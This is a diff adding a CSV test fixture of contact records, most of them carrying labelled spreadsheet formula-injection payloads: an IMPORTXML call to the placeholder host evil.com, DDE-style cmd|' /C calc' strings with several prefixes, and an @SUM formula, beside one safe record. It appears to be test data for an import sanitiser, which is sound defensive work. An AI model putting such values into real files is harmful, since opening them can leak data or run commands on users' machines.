@@ -1,0 +1,8 @@
+name,email,phone,notes
+=IMPORTXML("https://evil.com"),evil1@inject.com,+1-555-700-0001,CSV injection in name
+=cmd|' /C calc'!A0,evil2@inject.com,+1-555-700-0002,Command injection attempt
++SUM(1+1)*cmd|' /C calc'!A0,evil3@inject.com,+1-555-700-0003,Sum injection
+-2+3+cmd|' /C calc'!A0,evil4@inject.com,+1-555-700-0004,Minus injection
+@SUM(A1:A100),evil5@inject.com,+1-555-700-0005,At-sign injection
+Real Person,real@safe.com,+1-555-700-0006,This is a real safe record
+	=cmd|' /C calc',evil6@inject.com,+1-555-700-0007,Tab injection prefix
